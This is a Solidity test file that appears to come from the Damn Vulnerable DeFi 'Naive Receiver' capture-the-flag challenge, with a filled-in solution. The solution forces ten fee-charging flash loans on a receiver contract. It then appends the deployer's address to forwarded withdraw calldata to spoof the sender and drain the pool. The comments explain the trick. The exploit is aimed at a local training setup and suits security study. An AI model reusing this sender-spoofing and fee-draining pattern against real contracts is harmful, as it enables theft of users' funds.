// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        //call Forwarder to execute a multi-call
        //call 10 times FlashLoanReceiver.onFlashLoan + 1 time NaiveReceiverPool.withdraw

    /*//////////////////////////////////////////////////////////////
                              MUTILCALDATA
    //////////////////////////////////////////////////////////////*/
        bytes[] memory multicalData = new bytes[](11);
        bytes memory FlashLoanData = abi.encodeWithSelector(
            pool.flashLoan.selector,
            address(receiver),
            address(weth),
            1e18,
            "0x00"
        );

        bytes memory withdrawData = abi.encodeWithSelector(
            pool.withdraw.selector,
            WETH_IN_POOL + WETH_IN_RECEIVER,
            recovery
        );
        
        bytes32 misleadingData =bytes32(uint256(uint160(deployer)));
        //uint160是20字节，uint256是32字节，地址是20字节的，所以先转为20字节再转为32字节，之后再转为bytes32

        for (uint i = 0; i < 10; i++) {
            multicalData[i] = FlashLoanData;
        }

        multicalData[10] = abi.encodePacked(withdrawData, misleadingData);
//最后的第11个calldata 
//0x00f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000ae0bdc4eeac5e950b67c6819b118761caaf61946
//deployer address is 0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946 hides in the end of the calldata



    /*//////////////////////////////////////////////////////////////
                         REQUEST AND SIGNATURES
    //////////////////////////////////////////////////////////////*/
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1e10,
            nonce: forwarder.nonces(player),
            data: abi.encodeWithSelector(
                pool.multicall.selector,
                multicalData
            ),
            deadline: block.timestamp + 1
        });

        ///EIP712 signature
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);


        forwarder.execute(request, signature);



    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
